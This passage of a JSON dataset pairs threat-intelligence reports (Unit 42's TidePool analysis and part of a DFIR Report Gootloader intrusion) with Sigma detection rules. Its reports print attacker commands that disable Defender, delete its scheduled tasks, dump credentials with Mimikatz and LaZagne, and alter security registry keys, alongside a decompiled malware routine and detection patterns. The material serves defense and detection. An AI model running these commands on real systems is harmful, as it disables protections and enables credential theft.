            "6ADoAKAAnAEwAJwArACcAbwBhAGQAJwApA",
            "OgA6ACgAJwBMAG8AJwArACcAYQBkACcAKQ",
            "oAOgAoACcATABvACcAKwAnAGEAZAAnACkA",
            "6ADoAKAAnAEwAbwAnACsAJwBhAGQAJwApA",
            "OgA6ACgAJwBMAG8AYQAnACsAJwBkACcAKQ",
            "oAOgAoACcATABvAGEAJwArACcAZAAnACkA",
            "6ADoAKAAnAEwAbwBhACcAKwAnAGQAJwApA"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "CommandLine"
      ],
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_base64_reflection_assembly_load_obfusc.yml",
    "id": "329"
  },
  {
    "url": "https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/",
    "markdown": "# Operation Ke3chang Resurfaces With New TidePool Malware\n\n**Published:** May 22, 2016\n\n## Introduction\n\nLittle has been published on the threat actors responsible for Operation Ke3chang since the report was released more than two years ago. However, Unit 42 has recently discovered the actors have continued to evolve their custom malware arsenal. We’ve discovered a new malware family we’ve named TidePool. It has strong behavioral ties to Ke3chang and is being used in an ongoing attack campaign against Indian embassy personnel worldwide. This targeting is also consistent with previous attacker TTPs; Ke3chang historically targeted the Ministry of Affairs, and also conducted several prior campaigns against India.\n\nThough we don’t have comprehensive targeting information, the spear phishing emails we found targeted several Indian embassies in different countries. One decoy references an annual report filed by over 30 Indian embassies across the globe. The sender addresses of the phishing emails spoof real people with ties to Indian embassies, adding legitimacy to the emails to prompt the recipients to open the attached file. Also noteworthy, the actors are exploiting a relatively new vulnerability in their attacks with TidePool, which is detailed below.\n\nIn this report we will highlight the reuse of the code responsible for a variety of registry changes and command and control traffic over time as the Ke3chang actor has evolved their codebase to TidePool since the 2013 report.\n\n## Exploitation of CVE-2015-2545\n\nThe weaponized document sent in phishing emails triggers the vulnerability outlined in CVE-2015-2545, which was first made public in September 2015. Unlike previously seen exploit carrier docs, this version comes packaged as an MHTML document which by default opens in Microsoft Word. We have seen multiple waves of activity with similar exploit docs, including those referenced in our recent Spivy blog. PwC recently released a great report analyzing the exploit documents themselves. The samples we are covering are documented in the \"Windows User_A\" section of their report (the malware they refer to as \"Danti Downloader\").\n\n## The TidePool Malware Family\n\nTidePool contains many capabilities common to most RATs. It allows the attacker to read, write and delete files and folders, and run commands over named pipes. TidePool gathers information about the victim's computer, base64 encodes the data, and sends it to the Command and Control (C2) server via HTTP, which matches capabilities of the BS2005 malware family used by the Ke3chang actor.\n\nThe TidePool malware is housed in an MHTML document which exploits CVE-2015-2545. The exploit code drops a DLL into\n\n*`C:\\Documents and Settings\\AllUsers\\IEHelper\\mshtml.dll`*\n\nThis dropped DLL is the TidePool sample. It also launches Internet Explorer as a subprocess of the svchost service. For persistence, TidePool utilizes an ActiveSetup key, which will launch itself on boot with the following parameters:\n\n*`rundll32.exe C:\\DOCUME~1\\ALLUSE~1\\IEHelper\\mshtml.dll,,IEHelper`*\n\nThe TidePool sample then sends victim computer information to the C2 server, as shown in Figure 1. Once a connection is made, the sample behaves as a RAT, receiving commands from the C2.\n\n**Figure 1.** The Base64 encoded data contains information about the victim’s service pack level, the current user, and the NETBIOS name of the victim system.\n\n## The Evolution From BS2005 to TidePool\n\nDuring our initial triage of the TidePool samples in AutoFocus, we noticed Windows Registry modifications that by themselves were not unique, but when viewed together were used by multiple malware families. One of these families is the \"BS2005\" malware family used by the Ke3chang actor. This motivated us to dig deeper, since we had not seen any public reporting on them since 2013. From this analysis, Unit 42 compared the code bases of the new malware family, and the BS2005 malware samples. Based on our analysis we believe this new malware, which we are calling TidePool, is an evolution of the BS2005 malware family used by the Ke3chang actor.\n\nUnit 42 has discovered 11 similar registry modifications that both TidePool and BS2005 employ. The registry setting that TidePool and BS2005 focuses on is:\n\n*`Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IEHarden -> 0`*\n\nWhen the IEHarden Value is set to 0 it disables the Internet Explorer Enhanced Security configuration, which is designed to prevent the execution of scripts, ActiveX Controls, file downloads, and the Microsoft virtual machine for HTML content. This is a technique common to both BS2005 and TidePool malware.\n\nBelow is the routine within TidePool that modifies the IEHarden registry settings. The repetition, order, and uniqueness of the code base in this function allowed us to link TidePool back to older versions of BS2005 and Operation Ke3chang.\n\n```image\nAlt: Figure 2. Routine to modify the IEHarden Value linking TidePool to BS2005.\nDescription: The image depicts a section of code that appears to be a function responsible for modifying the Windows Registry settings related to Internet Explorer. The code includes operations to set specific values for keys such as 'DisableFirstRunCustomize' and 'Check_Associations,' as well as the 'IEHarden' value under the ZoneMap settings. This function is part of the analysis linking the TidePool malware to the earlier BS2005 malware family, highlighting common registry modification behaviors used by both.\nTranscription: |\n  c\n  BOOL sub_10002D03()\n  {\n      int v0; // eax@1\n      HKEY phkResult; // [esp+14h] [ebp-10h]@1\n      LPLUSTR lpString1; // [esp+18h] [ebp-Ch]@1\n      BYTE Data[4]; // [esp+1Ch] [ebp-8h]@1\n      LPLUSTR lpString; // [esp+1Ch] [ebp-8h]@1\n      HKEY hKey; // [esp+20h] [ebp-4h]@1\n      *(DWORD *)Data = 1;\n      lpString1 = (LPLUSTR)VirtualAlloc(0, 0x200u, 0x1000u, 4u);\n      v3 = (LPLUSTR)VirtualAlloc(0, 0x200u, 0x1000u, 4u);\n      memset(lpString1, 0, 0x200u);\n      memset(v3, 0, 0x200u);\n      lstrcatW(lpString1, L\"Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\\");\n      lstrcatW(v3, L\"Software\\\\Microsoft\\\\Internet Connection Wizard\\\\\");\n      RegOpenKeyExHKEY_CURRENT_USER, lpString1, 0, 0xF003Fu, &phkResult);\n      RegSetValueEx(phkResult, L\"DisableFirstRunCustomize\", 0, 4u, Data, 4u);\n      v0 = lstrlenW(L\"no\");\n      RegSetValueEx(phkResult, L\"Check_Associations\", 0, 1u, (const BYTE *)L\"no\", 2 * v0);\n      RegCloseKey(phkResult);\n      RegCreateKeyEx(HKEY_CURRENT_USER, v3, 0, 0, &hKey, 0);\n      RegOpenKeyEx(HKEY_CURRENT_USER, v3, 0, 0xF003Fu, &phkResult);\n      RegSetValueEx(phkResult, L\"IEHarden\", 0, 4u, Data, 4u);\n      RegCloseKey(phkResult);\n      VirtualFree(lpString1, 0x200u, 0);\n      return VirtualFree(v3, 0x200u, 0);\n  }\n```\n\nCode reuse overlap also allowed us to link the various interim malware iterations between Ke3chang and TidePool together. Going over every single code overlap would be tiresome, so we'll highlight major functional similarities that allowed us to link TidePool to Operation Ke3chang. A listing of similar hashes and their compile dates can be found in the IOC section at the end of this blog. They are also divided into those that pre-date the Operation Ke3chang report and those that came after.\n\nWe compared 5 key samples that link TidePool to the original Operation Ke3chang malware. In order of comparison and usage we looked at:\n\n- BS2005 Operation Ke3chang sample\n  - `233bd004ad778b7fd816b80380c9c9bd2dba5b694863704ef37643255797b41f`\n- 2013 post Ke3chang\n  - `012fe5fa86340a90055f7ab71e1e9989db8e7bb7594cd9c8c737c3a6231bc8cc`\n- 2014 post Ke3chang\n  - `04db80d8da9cd927e7ee8a44bfa3b4a5a126b15d431cbe64a508d4c2e407ec05`\n- 2014 post Ke3chang\n  - `eca724dd63cf7e98ff09094e05e4a79e9f8f2126af3a41ff5144929f8fede4b4`\n- 2015 Current TidePool\n  - `2252dcd1b6afacde3f94d9557811bb769c4f0af3cb7a48ffe068d31bb7c30e18`\n\nStarting with a known Operation Ke3chang BS2005 sample, we focus on the C2 obfuscation.\n\n```image\nAlt: Figure 3. Comparing a BS2005 and post Ke3chang sample C2 obfuscation routine.\nDescription: The image displays a code comparison between two subroutines in assembly language, specifically highlighting the differences in instructions and their flow. It consists of two sections side by side: the left side shows `sub_402C9B`, while the right side depicts `sub_402C47`. Both sections include details such as memory operations (e.g., `mov`, `add`, `xor`) and control flow instructions (e.g., `jle`, `j1`). The color-coded arrows indicate the flow between instructions, showing how they relate to one another, and assisting in understanding the similarities and differences in the code structure of the two subroutines.\nTranscription: |\n  00402C9B    sub_402C9B\n  00402CA3    mov     eax, eax\n  00402CA6    cmp     ss:[esp+arg_0], eax\n  00402CA9    jle     0x402CB7\n  \n  00402C9B    sub_402C9B\n  00402CA3    mov     b1, dl, b1[eax+ecx]\n  00402CA6    add     b1, dl, b1, 0x27\n  00402CAB    xor     b1, b1, dl\n  00402CAD    mov     b1, ds:[eax+ecx], b1\n  00402CB1    inc     b1\n  00402CB5    j1\n  \n  00402C9B    sub_402C9B\n  00402CA3    mov     eax, eax\n  00402CA6    cmp     ss:[esp+arg_0], eax\n  00402CA9    jle     0x402CB7\n  \n  00402C47    sub_402C47\n  00402C53    mov     b1, ds:[eax+ecx], b1\n  00402C56    add     b1, dl, b1, 0x5A\n  00402C58    xor     b1, b1, dl\n  00402C5B    mov     b1, ds:[eax+ecx], b1\n  00402C61    eax\n  00402C65    cmp     eax, ss:[esp+arg_4], eax\n  00402C67    j1\n  \n  00402C47    sub_402C47\n  00402C67    and     b1, ds:[eax+ecx], b1\n  00402C68    retn\n```\n\nNot only do BS2005 and TidePool share repeating registry behaviors, they also use a similar code routine to obfuscate the C2. Further analysis shows that they also share similar Base64 string handling. This routine goes back even further to MyWeb malware samples, also associated with Operation Ke3chang.\n\nNext we compared the codebase for setting registry keys. The code reuse displayed in Figure 4 is the sequence that sets the IEHarden registry keys and other keys used throughout TidePool and Operation Ke3chang malware.\n\n- `012fe5fa86340a90055f7ab71e1e9989db8e7bb7594cd9c8c737c3a6231bc8cc`\n- `04db80d8da9cd927e7ee8a44bfa3b4a5a126b15d431cbe64a508d4c2e407ec05`\n\n```image\nAlt: Figure 4. Sequence that sets the IEHarden registry keys and other keys used in TidePool and Operation Ke3chang samples.\nDescription: The image displays two sets of code snippets side by side, presumably from a code analysis tool. Each snippet shows assembly code related to different subroutines, with specific instructions highlighted. The left side includes the subroutine labeled 'sub_40128D' while the right side features 'sub_1001590'. Lines of code are color-coded, indicating function calls and parameters being pushed onto the stack. There are arrows linking corresponding sections, suggesting comparisons or similarities between the two functions, which is relevant to the discussion of code reuse in the context of the TidePool malware's evolution from the BS2005 malware family.\nTranscription: |\n  00040128D  sub_40128D\n  00040128D  push    eax\n  00040128D  lea     eax, [esp+var_14]\n  00040128D  push    eax\n  00040128D  push    esi\n  00040128D  push    ecx\n  00040128D  push    edx\n  00040128D  call    sub_4012B0\n  00040128D  add     esp, 10h\n  00040128D  ret\n  \n  0040128D  sub_40128D\n  0040128D  push    eax\n  0040128D  lea     eax, [esp+var_10]\n  0040128D  push    eax\n  0040128D  push    esi\n  0040128D  push    ecx\n  0040128D  push    edx\n  0040128D  call    sub_4012B0\n  0040128D  add     esp, 10h\n  0040128D  ret\n  \n  00001990  sub_1001990\n  00001990  push    edx\n  00001990  lea     edx, [esp+var_14]\n  00001990  push    edx\n  00001990  push    esi\n  00001990  push    ecx\n  00001990  push    eax\n  00001990  call    sub_1001B90\n  00001990  add     esp, 10h\n  00001990  ret\n  \n  10001990  sub_1001990\n  10001990  push    edx\n  10001990  lea     edx, [esp+var_14]\n  10001990  push    edx\n  10001990  push    esi\n  10001990  push    ecx\n  10001990  push    eax\n  10001990  call    sub_1001B90\n  10001990  add     esp, 10h\n  10001990  ret\n```\n\nThe code that handles URL beacon creation is shown in Figure 5. These functions also displayed quite a bit of code reuse.\n\n- `eca724dd63cf7e98ff09094e05e4a79e9f8f2126af3a41ff5144929f8fede4b4`\n- `012fe5fa86340a90055f7ab71e1e9989db8e7bb7594cd9c8c737c3a6231bc8cc`\n\n```image\nAlt: Figure 5. Comparing code blocks responsible for URL creation.\nDescription: The image displays a side-by-side comparison of two code routines, identified as `sub_4022CA` and `sub_4020E8`. Each section contains disassembled assembly code, highlighting similarities in function and structure. The image includes annotations and arrows pointing to specific lines of code, indicating areas of interest or significant similarity, which supports the analysis of code reuse between the TidePool and BS2005 malware. This technical detail is crucial for understanding the evolution of malware characteristics and behaviors.\nTranscription: |\n  04022CA  sub_4022CA\n  0402799  push   0x04E498      // as\n  04027A3  call   0x472058\n  04027AF  push   0x04E498      // aGoogle_0\n  04027B4  mov    eax, 0x472058\n  04027B8  call   0x420D51\n  04027BC  mov    eax, [esp+var_14], eax\n  04027C0  add    esp, 0x18\n  04027C4  mov    edx, 0x0400000\n  \n  04022CA  sub_4022CA\n  04027D7  mov    bl, ds: [ecx], b1 0\n  04027DB  inc    ecx\n  \n  04020E8  sub_4020E8\n  060C     push   0x04D0C8      // as\n  0611     push   0x470C04      // byte_470C04\n  0615     call   ebp\n  0618     call   0x04D0210\n  0622     push   eax            // pdvDataLen\n  0627     push   0x470C04\n  062B     call   0x420D25\n  0635     mov    eax, 0x0410084\n  063A     add    esp, 0x18\n  063E     mov    edx, 0x0400000\n  \n  04020E8  sub_4020E8\n  00402634  mov    bl, ds: [ecx], b1 0\n  00402647  inc    ecx\n```\n\nFinally, we compared the following two samples.\n\n- `04db80d8da9cd927e7ee8a44bfa3b4a5a126b15d431cbe64a508d4c2e407ec05`\n- `2252dcd1b6afacde3f94d9557811bb769c4f0af3cb7a48ffe068d31bb7c30e18`\n\nThese samples are quite similar when looking at the library functions used, but the most notable features they have in common are the timeline of behaviors executed. Ke3chang and TidePool both modify the IEHarden registry key, as well as the following list of keys. Setting these registry keys is unique to the Ke3chang and TidePool malware families.\n\n- `HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Check_Associations`\n- `HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\DisableFirstRunCustomize`\n- `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IEharden`\n\n## A Few Words On Attribution\n\nAttribution is an inexact process, however we have compiled several interesting findings which lend themselves to our conclusion that this activity and malware is related to the original Operation Ke3chang.\n\n- Strong behavioral overlap between the TidePool malware family and malware called BS2005 utilized by **Operation Ke3chang**\n- Strong code reuse and overlap showing a branching and evolution of malware from BS2005 to TidePool.\n- Targeting and attack method matches historic Ke3chang targeting.\n- When binaries included resources, encoding was 0x04 (LANG_CHINESE) indicating the actor’s system is likely running an operating system and software with Chinese as the default display language.\n\n## Conclusion\n\nDespite going unreported on since 2013, Operation Ke3chang has not ceased operations and in fact continued developing its malware. Unit 42 was able to track the evolution of Operation Ke3chang’s tools by observing unique behavioral quirks common throughout the malware’s lineage. By pivoting on these behaviors in AutoFocus, we were able to assess a relationship between these families dating back to at least 2012 and the creation of TidePool, a new malware family continuing in Ke3chang’s custom malware footsteps. While we can’t know all of the groups’ attacks using TidePool or older malware, we have uncovered its use against Indian Embassies, which was also documented in the 2013 report, indicating this is likely a high priority target as it has continued over multiple years.\n\nCustomers can utilize the Ke3changResurfaces AutoFocus tag to examine the samples discussed in this post. IPS coverage for TidePool is provided by TID 14588.\n\n## TidePool IOCs\n\n**Phishing emails:**\n\n- `4d5e0eddcd014c63123f6a46af7e53b5ac25a7ff7de86f56277fe39bff32c7b5`\n- `1896d190ed5c5d04d74f8c2bfe70434f472b43441be824e81a31b7257b717e51`\n- `de5060b7e9aaaeb8d24153fe35b77c27c95dadda5a5e727d99f407c8703db649`\n\n**Weaponized document attachments:**\n\n- `785e8a39eb66e872ff5abee48b7226e99bed2e12bc0f68fc430145a00fe523db`\n- `eea3f90db41f872da8ed542b37948656b1fb93b12a266e8de82c6c668e60e9fc`\n\n**TidePool Dropper:**\n\n- `38f2c86041e0446730479cdb9c530298c0c4936722975c4e7446544fd6dcac9f`\n\n**TidePool dlls:**\n\n- `67c4e8ab0f12fae7b4aeb66f7e59e286bd98d3a77e5a291e8d58b3cfbc1514ed`\n- `2252dcd1b6afacde3f94d9557811bb769c4f0af3cb7a48ffe068d31bb7c30e18`\n- `9d0a47bdf00f7bd332ddd4cf8d95dd11ebbb945dda3d72aac512512b48ad93ba`\n\n**C2 domain:**\n\n- `goback.strangled[.]net`\n\n## TidePool sample groupings\n\n**Group 1: 3/1/2012 - 3/22/2012**\n\n- `71b548e09fd51250356111f394e5fc64ac54d5a07d9bc57852315484c2046093` (BS2005)\n- `39fdcdf019c0fca350ec5bd3de31b6649456993b3f9642f966d610e0190f9297` (BS2005)\n- `bfa5d062bfc1739e1fcfacefd3a1f95b40104c91201efc618804b6eb9e30c018`\n- `4e38848fabd0cb99a8b161f7f4972c080ce5990016212330d7bfbe08ab49526a`\n- `d097a1d5f86b3a9585cca42a7785b0ff0d50cd1b61a56c811d854f5f02909a5d`\n- `25a3b374894cacd922e7ff870bb19c84a9abfd69405dded13c3a6ceb5abe4d27`\n\n**Group 2: 6/1/2012 - 7/10/2012**\n\n- `12cc0fdc4f80942f0ba9039a22e701838332435883fa62d0cefd3992867a9e88` (BS2005)\n- `a4fae981b687fe230364508a3324cf6e6daa45ecddd6b7c7b532cdc980679076` (BS2005)\n- `c1a83a9600d69c91c19207a8ee16347202d50873b6dc4613ba4d6a6059610fa1`\n\n**Group 3: 8/28/2012 - 11/19/2012**\n\n- `023e8f5922b7b0fcfe86f9196ae82a2abbc6f047c505733c4b0a732caf30e966` (BS2005)\n- `064051e462990b0a530b7bbd5e46b68904a264caee9d825e54245d8c854e7a8a` (BS2005)\n- `07aa6f24cec12b3780ebaba2ca756498e3110243ca82dca018b02bd099da36bb` (BS2005)\n- `cdb8a15ededa8b4dee4e9b04a00b10bf4b6504b9a05a25ecae0b0aca8df01ff9` (BS2005)\n- `f84a847c0086c92d7f90249be07bbf2602fe97488e2fef8d3e7285384c41b54e` (BS2005)\n- `89ccea68f76afa99d4b5d00d35b6d2f229c4af914fbb2763e37f5f87dcf2f7bf`\n- `be378ad63b61b03bdc6fd3ef3b81d3c2d189602a24a960118e074d7aff26c7bd`\n- `c5d274418532231a0a225fc1a659dd034f38fde051840f8ed39e0b960d84c056`\n\n**Group 4: 4/18/2013 - 11/5/2013**\n\n- `233bd004ad778b7fd816b80380c9c9bd2dba5b694863704ef37643255797b41f` (BS2005)\n- `3795fd3e1fe4eb8a56d611d65797e3947acb209ddb2b65551bf067d8e1fa1945` (BS2005)\n- `6d744f8a79e0e937899dbc90b933226e814fa226695a7f0953e26a5b65838c89` (BS2005)\n- `b344b9362ac274ca3547810c178911881ccb44b81847071fa842ffc8edfcd6ec` (BS2005)\n- `e72c5703391d4b23fcd6e1d4b8fd18fe2a6d74d05638f1c27d70659fbf2dcc58` (BS2005)\n- `690c4f474553a5da5b90fb43eab5db24f1f2086e6d6fd75105b54e616c490f3f`\n- `d64cd5b4caf36d00b255fdaccb542b33b3a7d12aef9939e35fdb1c5f06c2d69c`\n- `0ec913017c0adc255f451e8f38956cfc1877e1c3830e528b0eb38964e7dd00ff`\n\n**Post Fireye's Ke3chang blog**\n\n**Group 5: 5/2/2013 - 10/23/2013**\n\n- `012fe5fa86340a90055f7ab71e1e9989db8e7bb7594cd9c8c737c3a6231bc8cc`\n- `0f88602a11963818b73a52f00a4f670a0bf5111b49549aa13682b66dd9895155`\n- `2a454d9577d75ac76f5acf0082a6dca37be41f7c74e0a4dbd41d8a9a75120f5c`\n- `66d9001b6107e16cdb4275672e8dd21b3263481a56f461428909a7c265c67851`\n- `863ee162a18d429664443ce5c88a21fd629e22ad739191c7c6a9237f64cdd2f3`\n- `8b3ef6112f833d6d232864cf66b57a0f513e0663ee118f8d33d93ad8651af330`\n- `904e31e4ab030cba00b06216c81252f6ee189a2d044eca19d2c0dc41508512f3`\n\n**Group 6: 03/09/2014**\n\n- `F3c39376aa93b6d17903f1f3d6a557eb91a977dae19b4358ef57e686cd52cc03`\n- `7c17ccdd8eba3791773de8bc05ab4854421bc3f2554c7ded00065c10698300fe`\n\n**Group 7: 08/26/2014**\n\n- `eca724dd63cf7e98ff09094e05e4a79e9f8f2126af3a41ff5144929f8fede4b4`\n\n**Group 8: 04/09/2014**\n\n- `04db80d8da9cd927e7ee8a44bfa3b4a5a126b15d431cbe64a508d4c2e407ec05`\n\n**Group 9: 3/11/2015**\n\n- `6eb3528436c8005cfba21e88f498f7f9e3cf40540d774ab1819cddf352c5823d`\n\n**Group 10: 08/04/2015**\n\n- `6bcf242371315a895298dbe1cdec73805b463c13f9ce8556138fa4fa0a3ad242`\n\n**Group 11: 12/28/2015**\n\n- `2252dcd1b6afacde3f94d9557811bb769c4f0af3cb7a48ffe068d31bb7c30e18`\n- `38f2c86041e0446730479cdb9c530298c0c4936722975c4e7446544fd6dcac9f`\n- `67c4e8ab0f12fae7b4aeb66f7e59e286bd98d3a77e5a291e8d58b3cfbc1514ed`\n- `9d0a47bdf00f7bd332ddd4cf8d95dd11ebbb945dda3d72aac512512b48ad93ba`",
    "sigma_rule": {
      "title": "Disabled IE Security Features",
      "id": "fb50eb7a-5ab1-43ae-bcc9-091818cb8424",
      "status": "test",
      "description": "Detects command lines that indicate unwanted modifications to registry keys that disable important Internet Explorer security features",
      "references": [
        "https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2020-06-19",
      "modified": "2021-11-27",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection1": {
          "CommandLine|contains|all": [
            " -name IEHarden ",
            " -value 0 "
          ]
        },
        "selection2": {
          "CommandLine|contains|all": [
            " -name DEPOff ",
            " -value 1 "
          ]
        },
        "selection3": {
          "CommandLine|contains|all": [
            " -name DisableFirstRunCustomize ",
            " -value 2 "
          ]
        },
        "condition": "1 of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_disable_ie_features.yml",
    "id": "334"
  },
  {
    "url": "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/",
    "markdown": "# SEO Poisoning – A Gootloader Story\n\n**Categories:** \ncobaltstrike \ngootloader \nlazagne \npsexec\n\n**Published on:** \nMay 9, 2022\n\n---\n\nIn early February 2022, we witnessed an intrusion employing Gootloader (aka GootKit) as the initial access vector.\n\nThe intrusion lasted two days and comprised discovery, persistence, lateral movement, collection, defense evasion, credential access, and command and control activity. During the post-exploitation phase, the threat actors used RDP, WMI, Mimikatz, Lazagne, WMIExec, and SharpHound. The threat actors then used this access to review sensitive documents.\n\n## Background\n\nGootloader was the name assigned to the multi-staged payload distribution by Sophos in March 2021. The threat actors utilize SEO (search engine optimization) poisoning tactics to move compromised websites hosting malware to the top of certain search requests such as “what is the difference between a grand agreement and a contract?” or “freddie mac shared driveway agreement?”\n\nWhen the user searches for these phrases and clicks on one of the top results, they are left with a forum-looking web page where the user is instructed to download a file, which they accidentally execute (double click to open). You can learn more about Gootloader by reading these references: \n1. [“Gootloader” expands its payload delivery options](https://news.sophos.com/en-us/2021/03/01/gootloader-expands-its-payload-delivery-options/)\n2. [Gootloader: ‘Initial Access as a Service’ Platform Expands Its Search for High Value Targets](https://www.sentinelone.com/labs/gootloader-initial-access-as-a-service-platform-expands-its-search-for-high-value-targets/)\n3. [Gootloader](https://redcanary.com/threat-detection-report/threats/gootloader/)\n4. [Gootloader’s “mothership” controls malicious content](https://news.sophos.com/en-us/2021/08/12/gootloaders-mothership-controls-malicious-content/)\n\nThe researcher behind the @GootLoaderSites account is doing a great job of providing operational intelligence about the most recent malicious infrastructure. They also contact impacted businesses, monitor for newly created C2 addresses, and make the information public to the community. Thank you!\n\n```image\nAlt: Gootloader Infrastructure\nDescription: The image consists of a series of tweets from the account @GootLoaderSites, detailing current sites associated with the Gootloader malware. Each tweet mentions specific URLs that are serving malicious content, indicating the presence of malware on those sites. The tweets also express a willingness to assist affected parties in cleaning up their sites, highlighting ongoing monitoring and reporting efforts related to Gootloader's operations.\nTranscription: |\n  plaintext\n  GootLoader Sites @GootLoaderSites · Apr 16\n  Current #GootLoader/#Gootkit site, serving up malicious zip/js s\n  hxxps://www.jlfwealth.com/forum.php\n  \n  GootLoader Sites @GootLoaderSites · Apr 17\n  @JLFwealth FYI your site is delivering malware. Please let me know if you need help cleaning it up, DMs are open.\n  \n  GootLoader Sites @GootLoaderSites · Apr 15\n  Current #GootLoader/#Gootkit site, serving up malicious zip/js s\n  hxxps://www.joskel.nl/forum.php\n```\n\n## Case Summary\n\nThe intrusion started with a user searching Bing for “Olymplus Plea Agreement?”. The user then clicked on the second search result which led to the download and execution of a malicious javascript file (see video in Initial Access section). Upon execution, Gootloader utilized encoded PowerShell scripts to load Cobalt Strike into memory and persist on the host using a combination of registry keys and scheduled tasks.\n\nFifteen minutes after the initial execution, we observed the threat actors using the PowerShell implementation of SharpHound (BloodHound) to discover attack paths in the Active Directory-based network. The threat actors collected the results and pivoted to another host via a Cobalt Strike PowerShell beacon.\n\nAfter pivoting, they disabled Windows Defender, before executing a second Cobalt Strike payload for a different command and control server. Around an hour after the initial infection, the threat actors ran LaZagne to retrieve all saved credentials from the pivoted workstation. Meanwhile, on the beachhead host, the threat actors ran Mimikatz via PowerShell to extract credentials.\n\nWith those credentials, the threat actors used RDP from the beachhead host to the already compromised workstation host. They then targeted several other workstations with Cobalt Strike beacon executables; however, no further activity was observed on those endpoints other than the initial lateral movement.\n\nThe threat actors favored RDP and remote WMI as their preferred methods to interact with the hosts and servers of interest throughout the rest of the intrusion. After around a four-hour pause of inactivity, the threat actors enabled restricted admin mode via WMI on a domain controller and logged in using RDP.\n\nThe threat actors then used Lazagne again on the domain controller to extract more credentials. Our evidence shows that the attackers then began looking for interesting documents on file shares. They opened the documents one-by-one on the remote host via RDP. They directed their focus to documents with legal and insurance-related content.\n\nOn the second and final day of the intrusion, the threat actors ran Advanced IP Scanner from the domain controller via the RDP session. Additionally, they inspected the file server and backup server, looking for more interesting data before leaving the network.\n\n## Services\n\nWe offer multiple services, including a Threat Feed service that tracks Command and Control frameworks such as Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nWe also have artifacts and IOCs available from this case, such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\n\n## Timeline\n\n```image\nAlt: Timeline\nDescription: The image is a detailed timeline outlining the events of a cyber incident involving SEO poisoning and the Gootloader malware. It categorizes events by time and provides specific actions taken during the attack, such as 'Gootloader Execution,' 'Lateral Movement,' 'Mimikatz Execution,' and 'RDP Connections.' Each entry includes timestamps in UTC and descriptions of the executed commands, tools used, and affected systems. This structured format allows for easy tracking of the attack progression over two days.\nTranscription: |\n  plaintext\n  SEO Poisoning - A Gootloader Story\n  \n  Day 1\n  \n  14:43 UTC Gootloader Execution\n  - WScript.exe olympus.plex.agreement 34603.js\n  - kaiokok.adspardev.com 35.200.117.64:443\n  - Cobalt Strike loaded into memory\n  - 146.70.78.43:443\n  \n  15:00 UTC Lateral Movement from Beachhead Host to Workstation #1 and Disabling of Defender\n  - Via PowerShell Remote Service\n  - %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzADA...\n  - powershell.exe -nop -w hidden -c Set-MpPreference -DisableRealtimeMonitoring $true\n  - 146.70.78.43:443\n  \n  15:34 UTC Antivirus Check on Beachhead Host\n  - WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List\n  \n  14:58 UTC Discovery via Bloodhound\n  - Invoke-BloodHound -CollectionMethod All\n  \n  15:30 UTC Second Cobalt Strike Server on Workstation #1\n  - 37.120.198.225:443\n  \n  15:44 UTC Mimikatz Execution on Beachhead Workstation\n  - Invoke-Mimikatz\n  \n  15:48 UTC LaZagne Execution on Workstation #1\n  - ls.exe all -oN --output C:\\Users\n  \n  16:05 UTC RDP into Workstation #1 from Beachhead Host\n  - Restricted Admin Mode enabled via remote WMI prior to RDP connection\n  - reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0\n  - Microsoft Defender Scheduled Tasks Deleted\n  - C:\\Windows\\system32\\schtasks.exe /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\n  \n  16:38 - 17:01 UTC Lateral Movement to Three Additional User Workstations\n  - Remote Service Execution\n  - \\\\WORKSTATION\\ADMIN$\\abb6ca2.exe\n  \n  21:34 UTC RDP into Domain Controller from Beachhead\n  - Restricted Admin Mode enabled via remote WMI prior to RDP connection\n  - Invoke-WMIMExec -Target DomainController -Domain domain.local -Username USER -Hash \"...\" -Command \"powershell.exe reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0\" -verbose\n  - Microsoft Defender Scheduled Tasks Deleted\n  - Cobalt Strike Powershell payload executed through Powershell via RDP session\n  - LaZagne dropped and executed: ls.exe all -oN --output C:\\Users\n  \n  21:49 UTC RDP into File Share Server from Beachhead\n  - Restricted Admin Mode enabled via remote WMI prior to RDP connection\n  - Microsoft Defender Scheduled Tasks Deleted\n  - Cobalt Strike Powershell payload executed through Powershell via RDP session\n  \n  21:53 UTC Documents accessed on File Share Server interactively using Wordpad.exe\n  - C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE \"C:\\shares\\STAFFFILE.docx\"\n  \n  Day 2\n  \n  07:36 UTC Advanced IP Scanner used to port scan network from Domain Controller\n  - C:\\Users\\USER\\AppData\\Local\\Temp\\\\\\Advanced IP Scanner 2\\advanced_ip_scanner.exe\n  - Ports: 21,80,135,443,445,3389,8080,56133,58000,58157,58492,58682,60234,60464,64502\n  \n  07:45 UTC File Server SMB Shares accessed from Domain Controller\n  \n  7:54 UTC RDP Connection to Backup Server\n```\n\nAnalysis and reporting completed by 